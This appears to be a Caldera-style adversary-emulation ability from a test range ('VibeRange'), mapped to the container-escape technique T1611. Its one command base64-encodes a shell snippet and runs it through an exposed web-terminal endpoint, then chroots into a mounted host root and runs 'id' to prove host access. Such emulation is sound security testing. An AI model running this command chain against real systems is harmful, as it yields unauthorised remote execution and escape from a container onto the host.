---
- id: c0a1de4a-701d-4c9a-b541-936ff3871009
  name: VibeRange validate privileged host-mount escape
  description: Validate the system-monitor host root mount and execute a bounded identity proof in the mounted host context.
  tactic: privilege-escalation
  technique:
    attack_id: T1611
    name: Escape to Host
  platforms:
    linux:
      sh:
        command: >-
          command_b64=$(printf '%s' 'test -r #{viberange.target.host_mount}/etc/os-release; test -x #{viberange.target.host_mount}/usr/bin/id; chroot #{viberange.target.host_mount} /usr/bin/id; printf "VIBERANGE_HOST_ESCAPE=%s\\n" "#{viberange.run.id}"' | base64 -w0); /usr/local/bin/viberange-gotty-exec --url "http://#{viberange.target.ip}:#{viberange.target.system_monitor_port}" --command-b64 "$command_b64"
        timeout: 60
